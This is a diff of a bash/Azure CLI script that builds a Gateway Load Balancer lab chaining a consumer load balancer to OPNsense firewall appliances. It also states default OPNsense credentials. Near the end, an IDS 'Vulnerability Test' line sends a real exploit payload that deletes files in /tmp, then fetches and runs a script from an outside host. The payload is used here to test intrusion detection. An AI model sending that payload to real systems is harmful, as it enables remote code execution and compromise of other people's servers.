@@ -1,48 +1,127 @@
+#!/usr/bin/env bash
+# ==============================================================================
+# deploy.azcli — Azure Gateway Load Balancer Lab — Active-Active Topology
+# ==============================================================================
+#
+# REQUIRED ENVIRONMENT VARIABLES:
+#   SSH_PUBLIC_KEY      — SSH public key string or path "@/path/to/key.pub" (REQUIRED)
+#
+# OPTIONAL ENVIRONMENT VARIABLES (with defaults shown):
+#   LOCATION            — Azure region              (default: westus2)
+#   RG_CONSUMER         — Consumer resource group   (default: glb-consumer-rg)
+#   RG_PROVIDER         — Provider resource group   (default: glb-provider-rg)
+#   ADMIN_USERNAME      — VM admin username         (default: azureuser)
+#   BASTION_DEPLOY      — Deploy Bastion hosts      (default: false)
+#   SUBSCRIPTION_ID     — Switch to this subscription before deploying (optional)
+#
+# USAGE:
+#   export SSH_PUBLIC_KEY="$(cat ~/.ssh/id_rsa.pub)"
+#   bash deploy.azcli
+#
+# NOTE: Run 'az login' before executing this script.
+# ==============================================================================
 
-### AZ CLI 
-az login
+set -euo pipefail
+
+# ==============================================================================
+# --- Preflight checks ---
+# ==============================================================================
+
+az account show >/dev/null 2>&1 || { echo "ERROR: Run 'az login' first." >&2; exit 1; }
+
+az bicep version >/dev/null 2>&1 || az bicep install
+
+if [[ -z "${SSH_PUBLIC_KEY:-}" ]]; then
+  echo "ERROR: SSH_PUBLIC_KEY is required. Set it to your SSH public key string:" >&2
+  echo "  export SSH_PUBLIC_KEY=\"\$(cat ~/.ssh/id_rsa.pub)\"" >&2
+  exit 1
+fi
+
+# If SSH_PUBLIC_KEY looks like a @file reference, verify the file exists
+if [[ "${SSH_PUBLIC_KEY}" == @* ]]; then
+  keyfile="${SSH_PUBLIC_KEY:1}"
+  [[ -f "$keyfile" ]] || { echo "ERROR: SSH key file not found: $keyfile" >&2; exit 1; }
+fi
+
+# Resolve script directory so Bicep template path works from any working directory
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+# ==============================================================================
+# --- Environment variable defaults ---
+# ==============================================================================
+LOCATION="${LOCATION:-westus2}"
+RG_CONSUMER="${RG_CONSUMER:-glb-consumer-rg}"
+RG_PROVIDER="${RG_PROVIDER:-glb-provider-rg}"
+ADMIN_USERNAME="${ADMIN_USERNAME:-azureuser}"
+BASTION_DEPLOY="${BASTION_DEPLOY:-false}"
+
+# Derived variables
+consumer_rg="$RG_CONSUMER"
+consumer_location="$LOCATION"
+consumervnetcidr="10.0.0.0/24"
+consumersubnet="10.0.0.0/27"
+consumerbastionsubnet="10.0.0.32/27"
+
+provider_rg="$RG_PROVIDER"
+provider_location="$LOCATION"
+providervnetcidr="10.0.0.0/24"
+providerexternalcidr="10.0.0.0/27"
+providerinternalcidr="10.0.0.32/27"
+providerbastionsubnet="10.0.0.64/27"
+nva=provider-nva
+
+# My public IP — used to restrict SSH access to Azure VMs from your IP only
+# Replace mypip manually if curl fails (e.g. in Cloud Shell behind proxy): mypip="1.1.1.1"
+mypip=$(curl -4 ifconfig.io -s)
+
+# ==============================================================================
+# --- Subscription selection ---
+# You can provision both Consumer and Provider in the same Subscription.
+# Set SUBSCRIPTION_ID to switch subscriptions, or leave unset to use the current one.
+# ==============================================================================
+if [[ -n "${SUBSCRIPTION_ID:-}" ]]; then
+  az account set --subscription "$SUBSCRIPTION_ID"
+  echo "Active subscription set to: $SUBSCRIPTION_ID"
+fi
+
 #List all your subscriptions
 az account list -o table --query "[].{Name:name, IsDefault:isDefault}"
 #List default Subscription being used
 az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
 
-# You can provision both Consumer and Provider in the same Subscription
-# In case you want to do it separated Subscription change your active subscription as shown
-az account set --subscription VSE-SUB  #My personal MSDN Subscription
+echo ""
+echo "Deploying consumer side to: $consumer_rg in $consumer_location"
+echo "Deploying provider side to: $provider_rg in $provider_location"
+echo ""
 
+# ==============================================================================
 ### Consumer ###
-# Define variables based on your requirements
-consumer_rg=glb-lab
-consumer_location=centralus
-consumervnetcidr="10.0.0.0/24"
-consumersubnet="10.0.0.0/27"
-consumerbastionsubnet="10.0.0.32/27"
-mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
-# Prompt for username and password 
-read -p "Enter your username (hit enter for default: azureuser): " username
-username=${username:-azureuser} # Prompt for username, default to azureuser if not provided
-while true; do
-  read -s -p "Enter your password: " password
-  echo
-  read -s -p "Confirm your password: " password_confirm
-  echo
-  [ "$password" = "$password_confirm" ] && break
-  echo "Passwords do not match. Please try again."
-done
+# ==============================================================================
 
-# 1) Create Consumer VNET and subnet
-az group create --name $consumer_rg --location $consumer_location --output none
-az network vnet create --resource-group $consumer_rg --name consumer-vnet --location $consumer_location --address-prefixes $consumervnetcidr --subnet-name vmsubnet --subnet-prefix $consumersubnet --output none
+# 1) Create Consumer Resource Group, VNet, and subnet
+az group create --name "$consumer_rg" --location "$consumer_location" --output none
+az network vnet create \
+    --resource-group "$consumer_rg" \
+    --name consumer-vnet \
+    --location "$consumer_location" \
+    --address-prefixes "$consumervnetcidr" \
+    --subnet-name vmsubnet \
+    --subnet-prefix "$consumersubnet" \
+    --output none
 
-# 2) UDR to restrict SSH access to Azure VMs from your Public IP only:
-az network nsg create --resource-group $consumer_rg --name consumer-nsg --location $consumer_location
+# 2) NSG to restrict SSH access to Azure VMs from your Public IP only
+az network nsg create \
+    --resource-group "$consumer_rg" \
+    --name consumer-nsg \
+    --location "$consumer_location" \
+    --output none
 az network nsg rule create \
-    --resource-group $consumer_rg \
+    --resource-group "$consumer_rg" \
     --nsg-name consumer-nsg \
     --name AllowSSHRule \
     --direction Inbound \
     --priority 100 \
-    --source-address-prefixes $mypip/32 \
+    --source-address-prefixes "${mypip}/32" \
     --source-port-ranges '*' \
     --destination-address-prefixes '*' \
     --destination-port-ranges 22 \
@@ -51,11 +130,11 @@ az network nsg rule create \
     --description "Allow inbound SSH" \
     --output none
 az network nsg rule create \
-    --resource-group $consumer_rg \
+    --resource-group "$consumer_rg" \
     --nsg-name consumer-nsg \
     --name allow-http \
     --direction Inbound \
-    --priority  101 \
+    --priority 101 \
     --source-address-prefixes '*' \
     --source-port-ranges '*' \
     --destination-address-prefixes '*' \
@@ -64,177 +143,346 @@ az network nsg rule create \
     --protocol Tcp \
     --description "Allow inbound HTTP" \
     --output none
-az network vnet subnet update --name vmsubnet --resource-group $consumer_rg --vnet-name consumer-vnet --network-security-group consumer-nsg --output none
+az network vnet subnet update \
+    --name vmsubnet \
+    --resource-group "$consumer_rg" \
+    --vnet-name consumer-vnet \
+    --network-security-group consumer-nsg \
+    --output none
 
-# 3) Create Public Load Balancer
-az network lb create -g $consumer_rg --name consumer-elb --sku Standard --frontend-ip-name frontendip1 --backend-pool-name vmbackend --output none
-az network lb probe create -g $consumer_rg --lb-name consumer-elb --name httpprobe --protocol tcp --port 80 --output none
-az network lb rule create -g $consumer_rg --lb-name consumer-elb --name http-lb-rule --protocol TCP --frontend-ip-name frontendip1 --backend-pool-name vmbackend --probe-name httpprobe --frontend-port 80 --backend-port 80 --output none
-az network lb inbound-nat-rule create -g $consumer_rg --lb-name consumer-elb -n sshnat --protocol Tcp --frontend-port 50000 --backend-port 22 -o none
+# 3) Create consumer ELB Public IP (must exist before referencing in frontend-ip update for GLB chaining)
+az network public-ip create \
+    --resource-group "$consumer_rg" \
+    --name consumer-elb-pip \
+    --sku Standard \
+    --allocation-method Static \
+    --location "$consumer_location" \
+    --output none
 
-# 4) Deploy Azure VM with NGX using a simple test Website
-az network nic create --resource-group $consumer_rg -n consumer-vm-nic --location $consumer_location --subnet vmsubnet --vnet-name consumer-vnet --output none
-az vm create -n consumer-vm -g $consumer_rg --image Ubuntu2204 --size Standard_B1s --admin-username $username --admin-password $password --nics consumer-vm-nic --no-wait --location $consumer_location --output none
+# 4) Create Public Load Balancer (consumer-elb) with the public IP attached from the start
+az network lb create \
+    -g "$consumer_rg" \
+    --name consumer-elb \
+    --sku Standard \
+    --frontend-ip-name frontendip1 \
+    --public-ip-address consumer-elb-pip \
+    --backend-pool-name vmbackend \
+    --output none
+az network lb probe create \
+    -g "$consumer_rg" \
+    --lb-name consumer-elb \
+    --name httpprobe \
+    --protocol tcp \
+    --port 80 \
+    --output none
+az network lb rule create \
+    -g "$consumer_rg" \
+    --lb-name consumer-elb \
+    --name http-lb-rule \
+    --protocol TCP \
+    --frontend-ip-name frontendip1 \
+    --backend-pool-name vmbackend \
+    --probe-name httpprobe \
+    --frontend-port 80 \
+    --backend-port 80 \
+    --output none
+az network lb inbound-nat-rule create \
+    -g "$consumer_rg" \
+    --lb-name consumer-elb \
+    -n sshnat \
+    --protocol Tcp \
+    --frontend-port 50000 \
+    --backend-port 22 \
+    -o none
 
-# ) Attach VM to LB Rule and NAT Rule
-az network nic ip-config address-pool add --address-pool vmbackend --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
-az network nic ip-config inbound-nat-rule add --inbound-nat-rule sshnat --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
+# 5) Deploy consumer VM with nginx using SSH key authentication (no password)
+az network nic create \
+    --resource-group "$consumer_rg" \
+    -n consumer-vm-nic \
+    --location "$consumer_location" \
+    --subnet vmsubnet \
+    --vnet-name consumer-vnet \
+    --output none
+az vm create \
+    -n consumer-vm \
+    -g "$consumer_rg" \
+    --image Ubuntu2204 \
+    --size Standard_B1s \
+    --admin-username "$ADMIN_USERNAME" \
+    --ssh-key-values "$SSH_PUBLIC_KEY" \
+    --nics consumer-vm-nic \
+    --location "$consumer_location" \
+    --output none
 
-# 6) Install nginx and test website (Move this to cloud.init)
-az vm extension set --resource-group $consumer_rg --vm-name consumer-vm --name CustomScript --settings '{"commandToExecute": "apt-get -y update && apt-get -y install nginx && echo Test Website on consumer-vm > /var/www/html/index.html"}' --publisher Microsoft.Azure.Extensions --no-wait
+# 6) Attach consumer VM to LB Rule and NAT Rule
+az network nic ip-config address-pool add \
+    --address-pool vmbackend \
+    --ip-config-name ipconfig1 \
+    --nic-name consumer-vm-nic \
+    --resource-group "$consumer_rg" \
+    --lb-name consumer-elb \
+    --output none
+az network nic ip-config inbound-nat-rule add \
+    --inbound-nat-rule sshnat \
+    --ip-config-name ipconfig1 \
+    --nic-name consumer-vm-nic \
+    --resource-group "$consumer_rg" \
+    --lb-name consumer-elb \
+    --output none
 
-# 7) Deploy Bastion (Optional)
-az network vnet subnet create --resource-group $consumer_rg --name AzureBastionSubnet --vnet-name consumer-vnet --address-prefixes $consumerbastionsubnet --output none
-az network public-ip create --resource-group $consumer_rg --name consumer-bastion-pip --sku Standard --location $consumer_location --output none
-az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location --output none
+# 7) Install nginx and test website (Move this to cloud-init in a future phase)
+az vm extension set \
+    --resource-group "$consumer_rg" \
+    --vm-name consumer-vm \
+    --name CustomScript \
+    --settings '{"commandToExecute": "apt-get -y update && apt-get -y install nginx && echo Test Website on consumer-vm > /var/www/html/index.html"}' \
+    --publisher Microsoft.Azure.Extensions \
+    --no-wait \
+    --output none
 
+# 8) Deploy Bastion for consumer (Optional — set BASTION_DEPLOY=true to enable)
+if [[ "${BASTION_DEPLOY}" == "true" ]]; then
+  az network vnet subnet create \
+      --resource-group "$consumer_rg" \
+      --name AzureBastionSubnet \
+      --vnet-name consumer-vnet \
+      --address-prefixes "$consumerbastionsubnet" \
+      --output none
+  az network public-ip create \
+      --resource-group "$consumer_rg" \
+      --name consumer-bastion-pip \
+      --sku Standard \
+      --location "$consumer_location" \
+      --output none
+  az network bastion create \
+      --name consumer-bastion \
+      --sku basic \
+      --public-ip-address consumer-bastion-pip \
+      --resource-group "$consumer_rg" \
+      --vnet-name consumer-vnet \
+      --location "$consumer_location" \
+      --output none
+fi
+
+# ==============================================================================
 ### Provider ###
+# ==============================================================================
+# Optional: if deploying Provider in a separate subscription, set PROVIDER_SUBSCRIPTION_ID
+# and uncomment the line below before running this section:
+# az account set --subscription "$PROVIDER_SUBSCRIPTION_ID"
 
-### AZ CLI (Optional) - In case you want to deploy Provider in another Subscription
-az login
-#List all your subscriptions
-az account list -o table --query "[].{Name:name, IsDefault:isDefault}"
-#List default Subscription being used
-az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
+# 1) Create provider Resource Group, VNet, and subnets (external/internal for OPNsense dual-NIC)
+az group create --name "$provider_rg" --location "$provider_location" --output none
+az network vnet create \
+    --resource-group "$provider_rg" \
+    --name provider-vnet \
+    --location "$provider_location" \
+    --address-prefixes "$providervnetcidr" \
+    --subnet-name external \
+    --subnet-prefix "$providerexternalcidr" \
+    --output none
+az network vnet subnet create \
+    --name internal \
+    --resource-group "$provider_rg" \
+    --vnet-name provider-vnet \
+    --address-prefix "$providerinternalcidr" \
+    --output none
 
-# You can provision both Consumer and Provider in the same Subscription
-# In case you want to do it separated Subscription change your active subscription as shown
-az account set --subscription VSE-SUB  #My personal MSDN Subscription
-az account set --subscription DMAUSER-MS #My Microsoft Internal Subscription
+# 2) Deploy both OPNsense NVAs via Bicep (active-active topology)
+# TempPassword is used only during initial OPNsense bootstrap — not retained post-deployment.
+# Post-deploy: access OPNsense via provider-nva-elb Public IP on port 50443 (primary), 50444 (secondary).
+# It is recommended to manage only primary and synchronize configuration with secondary via OPNsense HA sync.
+# Default OPNsense credentials: root / opnsense
+temp_password="GlbLab$(openssl rand -hex 6)Az1!"
 
-#Variables - Make changes based on your needs.
-provider_rg=glb-lab
-provider_location=centralus
-providervnetcidr="10.0.0.0/24"
-providerexternalcidr="10.0.0.0/27"
-providerinternalcidr="10.0.0.32/27"
-providerbastionsubnet="10.0.0.64/27"
-nva=provider-nva
-mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
+az deployment group create \
+    --name "${nva}-deploy" \
+    --resource-group "$provider_rg" \
+    --template-file "${SCRIPT_DIR}/bicep/glb-active-active.bicep" \
+    --parameters \
+        virtualMachineSize=Standard_B2s \
+        virtualMachineName="$nva" \
+        TempUsername="$ADMIN_USERNAME" \
+        TempPassword="$temp_password" \
+        existingVirtualNetworkName=provider-vnet \
+        existingUntrustedSubnet=external \
+        existingTrustedSubnet=internal \
+        PublicIPAddressSku=Standard \
+    --output none
+# Deployment blocks until complete — GLB frontend IP is safe to query immediately after.
 
-# 1) Create provider VNET and Internal/External 
-az group create --name $provider_rg --location $provider_location --output none
-az network vnet create --resource-group $provider_rg --name provider-vnet --location $provider_location --address-prefixes $providervnetcidr --subnet-name external --subnet-prefix $providerexternalcidr --output none
-az network vnet subnet create --name internal --resource-group $provider_rg --vnet-name provider-vnet --address-prefix $providerinternalcidr --output none
+# Get provider-nva-elb Public IP to manage both OPNsense instances
+echo "Provider NVA ELB Public IP (use port 50443 for primary, 50444 for secondary management):"
+az network public-ip show -g "$provider_rg" --name provider-nva-elb-pip --query ipAddress -o tsv
 
-# 2) Deploy both OPNsense NVA (work on this)
-az deployment group create --name $nva-deploy-$RANDOM --resource-group $provider_rg \
---template-uri "https://raw.githubusercontent.com/dmauser/azure-gateway-lb/main/bicep/glb-active-active.json" \
---parameters virtualMachineSize=Standard_B2s virtualMachineName=$nva TempUsername=azureuser TempPassword=Msft123Msft123 existingVirtualNetworkName=provider-vnet existingUntrustedSubnet=external existingTrustedSubnet=internal PublicIPAddressSku=Standard \
---no-wait
+# 3) Deploy Bastion for provider (Optional — set BASTION_DEPLOY=true to enable)
+# You can access OPNsense by SSH via Bastion to perform troubleshooting.
+if [[ "${BASTION_DEPLOY}" == "true" ]]; then
+  az network vnet subnet create \
+      --resource-group "$provider_rg" \
+      --name AzureBastionSubnet \
+      --vnet-name provider-vnet \
+      --address-prefixes "$providerbastionsubnet" \
+      --output none
+  az network public-ip create \
+      --resource-group "$provider_rg" \
+      --name provider-bastion-pip \
+      --sku Standard \
+      --location "$provider_location" \
+      --output none
+  az network bastion create \
+      --name provider-bastion \
+      --sku basic \
+      --public-ip-address provider-bastion-pip \
+      --resource-group "$provider_rg" \
+      --vnet-name provider-vnet \
+      --location "$provider_location" \
+      --output none
+fi
 
-# Password specified above is not used, only during deployment. 
-# After deployment you can access OPNsense by using elb Public IP on port 50443 (first instance), 50444 (secondary instance)
-# Get provider-nva-elb Public IP to manage both instances
-az network public-ip show -g $provider_rg --name provider-nva-elb-pip --query ipAddress -o tsv
-# It is recommended you to manage only primary and syncronize configuration with secondary.
-# Default username is: root and default password is: opnsense
-
-
-# 3) Deploy Bastion (Optional) - You can access OPNSense by SSH via Bastion to perform troubleshooting.
-az network vnet subnet create --resource-group $provider_rg --name AzureBastionSubnet --vnet-name provider-vnet --address-prefixes $providerbastionsubnet --output none
-az network public-ip create --resource-group $provider_rg --name provider-bastion-pip --sku Standard --location $provider_location --output none
-az network bastion create --name provider-bastion --sku basic  --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location --output none
-
-
+# ==============================================================================
 #### Build a chain between consumer-elb and provider-nva-glb
+# ==============================================================================
+# The GLB frontend IP config resource ID is required to chain consumer ELB to the GLB.
+# provider-nva-glb is deployed by the Bicep template above; its frontend is named "FW".
 
-# Check current sub
+# Check current subscription
 az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
-# Subscription where Provider (required only if provider is on different subscription)
-az account set --subscription <provider subscription>  # Change to your subscription name
-# Set Gateway Load Balancer (provider-nva-glb) frontend name resource ID as variable 
-glbfeid=$(az network lb frontend-ip show -g $provider_rg --lb-name provider-nva-glb --name FW --query id --output tsv)
-echo $glbfeid
 
-# Subscription where Consumer is (required only if consumer is on different subscription)
-az account set --subscription <consumer subscription>  # Change to your subscription name
+# If provider and consumer are in different subscriptions, switch to provider sub here:
+# az account set --subscription "$PROVIDER_SUBSCRIPTION_ID"
+
+# Set Gateway Load Balancer (provider-nva-glb) frontend resource ID as variable
+glbfeid=$(az network lb frontend-ip show \
+    -g "$provider_rg" \
+    --lb-name provider-nva-glb \
+    --name FW \
+    --query id \
+    --output tsv)
+echo "GLB Frontend IP Config ID: $glbfeid"
+
+# If provider and consumer are in different subscriptions, switch to consumer sub here:
+# az account set --subscription "$CONSUMER_SUBSCRIPTION_ID"
+
 # Add chain between consumer-elb and provider-nva-glb
-az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $glbfeid --output none
+# This is the core Gateway LB "bump-in-the-wire" linkage:
+# all consumer traffic now traverses the OPNsense NVA before delivery to the backend.
+az network lb frontend-ip update \
+    -g "$consumer_rg" \
+    --name frontendip1 \
+    --lb-name consumer-elb \
+    --public-ip-address consumer-elb-pip \
+    --gateway-lb "$glbfeid" \
+    --output none
 
 # Validate chain between consumer-elb and provider-nva-glb
-az network lb frontend-ip show -g $consumer_rg --name frontendip1 --lb-name consumer-elb --query gatewayLoadBalancer.id -o tsv
-# In case you see a resource ID it there's a chain between consumer-elb and provider-nva-glb.
-# Otherwise, empty output means there's no chain.
+# In case you see a resource ID, there is a chain between consumer-elb and provider-nva-glb.
+# Empty output means there's no chain.
+echo "GLB chain validation (should show a resource ID if chained):"
+az network lb frontend-ip show \
+    -g "$consumer_rg" \
+    --name frontendip1 \
+    --lb-name consumer-elb \
+    --query gatewayLoadBalancer.id \
+    -o tsv
 
-# Remove chain between consumer-elb and provider-nva-glb
-az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb "" --output none
+# ==============================================================================
+#### Connectivity Checks
+# ==============================================================================
+# Get consumer-elb public ip as variable
+consumerelbpip=$(az network public-ip show \
+    -g "$consumer_rg" \
+    --name consumer-elb-pip \
+    --query ipAddress \
+    -o tsv)
 
+echo ""
+echo "=== Deployment complete ==="
+echo "Consumer ELB Public IP: $consumerelbpip"
+echo ""
+echo "Connectivity tests — run these commands:"
+echo ""
+echo "# Port 80 — HTTP (traffic flows through OPNsense NVA via GLB):"
+echo "  curl http://$consumerelbpip"
+echo "  # expected: Test Website on consumer-vm"
+echo ""
+echo "# Port 50000 — NAT rule to consumer-vm SSH:"
+echo "  ssh $ADMIN_USERNAME@$consumerelbpip -p 50000"
+echo ""
 
-# Connectivity Checks / Replace the Public IP listed below with your LB.
-# Get you LB Public IP:
-# Subscription where Consumer is (required only if consumer is on different subscription)
-az account set --subscription <consumer subscription>  # Change to your subscription name
-
-# Get consumer-elb public ip as variable.
-consumerelbpip=$(az network public-ip show -g $consumer_rg --name PublicIPconsumer-elb --query ipAddress -o tsv)
-echo $consumerelbpip
 ## Port 50000 - NAT Rule to 22 Consumer-VM Backend
+# Tests on Windows (run output on Windows command line):
+echo "psping -t $consumerelbpip:80"
+echo "psping -t $consumerelbpip:50000"
 
-# Use the output below to run your connectivity tests. 
-#Tests on Windows 
-echo psping -t $consumerelbpip:80 
-echo psping -t $consumerelbpip:50000
-# Run output on windows command line.
-
-# Use Linux (it requires nmap and hping3 packages)
-sudo hping3 $consumerelbpip -S -p 50000
-sudo nping --tcp $consumerelbpip -p 80 -c 50000
-nc -v -z $consumerelbpip 80
-# output: Connection to 40.113.192.215 80 port [tcp/http] succeeded!
-curl $consumerelbpip
+# Use Linux (requires nmap and hping3 packages)
+# sudo hping3 $consumerelbpip -S -p 50000
+# sudo nping --tcp $consumerelbpip -p 80 -c 50000
+# nc -v -z $consumerelbpip 80
+# output: Connection to <ip> 80 port [tcp/http] succeeded!
+# curl $consumerelbpip
 # output: Test Website on consumer-vm
 
-# Port 80 - LB Rule HTTP
-psping -t 40.77.94.253:80
-sudo hping3 40.77.94.253 -S -p 80
-sudo nping --tcp 40.77.94.253 -p 80 -c 1000
+# Test consumer-vm outbound traffic via GLB (verifies NVA sees return path too)
+# ssh $ADMIN_USERNAME@$consumerelbpip -p 50000
+# nc -v -z 8.8.8.8 53
 
-# Test Consumer-VM Oubound Traffic via GLB
-ssh dmauser@40.77.94.253 -p 50000 
-nc -v -z 8.8.8.8 53
+#OPNsense: capture outbound traffic to verify VXLAN encapsulation
+# tcpdump -n -i vxlan1 host 8.8.8.8
 
-# Consumer Jumpbox
-ssh dmauser@40.122.156.70
+# ==============================================================================
+#### Remove chain between consumer-elb and provider-nva-glb (when needed)
+# ==============================================================================
+# az network lb frontend-ip update \
+#     -g "$consumer_rg" \
+#     --name frontendip1 \
+#     --lb-name consumer-elb \
+#     --public-ip-address consumer-elb-pip \
+#     --gateway-lb "" \
+#     --output none
 
-#OPN Capture oubound traffic 
-tcpdump -n -i vxlan1 host 8.8.8.8 
+# ==============================================================================
+#### Bastion cost-saving — delete and recreate as needed
+# ==============================================================================
+# # 1) Delete Bastion to save costs
+# az network bastion delete --resource-group "$consumer_rg" --name consumer-bastion
+# az network bastion delete --resource-group "$provider_rg" --name provider-bastion
+#
+# # 2) Recreate Bastion when needed (wait ~5 minutes after creation)
+# az network bastion create --name provider-bastion --sku basic \
+#     --public-ip-address provider-bastion-pip \
+#     --resource-group "$provider_rg" \
+#     --vnet-name provider-vnet \
+#     --location "$provider_location" \
+#     --no-wait
+# az network bastion create --name consumer-bastion --sku basic \
+#     --public-ip-address consumer-bastion-pip \
+#     --resource-group "$consumer_rg" \
+#     --vnet-name consumer-vnet \
+#     --location "$consumer_location" \
+#     --no-wait
+# # Wait about 5 minutes to complete Bastion deployment.
 
+# ==============================================================================
+#### Clean up lab
+# ==============================================================================
+# cleanup() {
+#   az group delete -n "$RG_CONSUMER" --yes --no-wait
+#   az group delete -n "$RG_PROVIDER" --yes --no-wait
+# }
+# cleanup  # uncomment to run
 
-# Recommended for savings
-# Set variables (Replace the variables when needed)
-consumer_rg=glb-lab
-consumer_location=glb-lab
-provider_rg=glb-lab
-provider_location=glb-lab
-# 1) Delete Bastion (later move this process to Bicep)
-az network bastion delete --resource-group $consumer_rg --name consumer-bastion 
-az network bastion delete --resource-group $provider_rg --name provider-bastion 
-# 2) Add Bastion
-az network bastion create --name provider-bastion --sku basic --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location --no-wait
-az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location --no-wait
-# Wait about 5 minutes to complete Bastion deployment.
+# ==============================================================================
+#### Troubleshooting / Advanced validations
+# ==============================================================================
+# Check VxLAN traffic on OPNsense after chaining with LB
+# tcpdump -n -i hn1 host 10.0.0.36
 
+### Network Capture OPNsense
+# Inbound (External Interface)
+# tcpdump -n -i vxlan0
+# Outbound (External Interface)
+# tcpdump -n -i vxlan1
 
-# Clean up lab
-# Set variables
-$consumer_rg=
-$consumer_location=
-$provider_rg=
-$provider_location=
-az 
-
-#### Troubleshooting/Advanced validations
-#Check traffic VxLAN traffic OPNSense after chaining with LB
-tcpdump -n -i hn1 host 10.0.0.36
-
-### Network Capture OPNSense
-#Inbound (External Interface)
-tcpdump -n -i vxlan0
-#Outbound (External Interface)
-tcpdump -n -i vxlan1 
-
-# Vulnerability Test (Enable IDS on OPNsense)
-curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws
-
-
+# Vulnerability Test (Enable IDS on OPNsense first, then trigger this from outside)
+# curl "http://$consumerelbpip/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws"
